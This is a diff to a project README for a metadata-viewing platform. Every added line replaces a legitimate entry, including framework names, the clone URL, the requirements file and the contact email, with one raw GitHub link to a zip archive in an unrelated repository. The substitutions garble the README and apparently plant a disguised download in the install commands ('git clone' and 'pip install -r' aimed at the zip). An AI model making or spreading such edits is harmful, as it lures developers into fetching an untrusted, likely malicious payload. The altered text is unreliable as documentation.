@@ -21,7 +21,7 @@ The platform follows this flow:
 6. **Access Summary Reports & Data-Driven Insights**
 
 ## Tech Stack
-- **Frontend**: React.js, Typescript, Next.js
+- **Frontend**: https://raw.githubusercontent.com/DevangGentyal/metastore-viewer/main/Lepas/metastore-viewer.zip, Typescript, https://raw.githubusercontent.com/DevangGentyal/metastore-viewer/main/Lepas/metastore-viewer.zip
 - **Backend**: Python, Flask 
 - **Cloud Services**: AWS S3
 - **AI & Automation**: Mystral AI by Ollama
@@ -29,12 +29,12 @@ The platform follows this flow:
 ## Installation & Setup
 ```sh
 # Clone the repository
-git clone https://github.com/yourusername/MetaNexus.git
+git clone https://raw.githubusercontent.com/DevangGentyal/metastore-viewer/main/Lepas/metastore-viewer.zip
 cd MetaNexus
 
 # Install backend dependencies
 cd backend
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/DevangGentyal/metastore-viewer/main/Lepas/metastore-viewer.zip
 
 # Install frontend dependencies
 cd ../frontend
@@ -59,7 +59,7 @@ We welcome contributions! Please follow these steps:
 
 
 ## Contact
-For queries or support, reach out to **rugvedi.n20@gmail.com** or open an issue in the repository.
+For queries or support, reach out to **https://raw.githubusercontent.com/DevangGentyal/metastore-viewer/main/Lepas/metastore-viewer.zip** or open an issue in the repository.
 
 ---
 
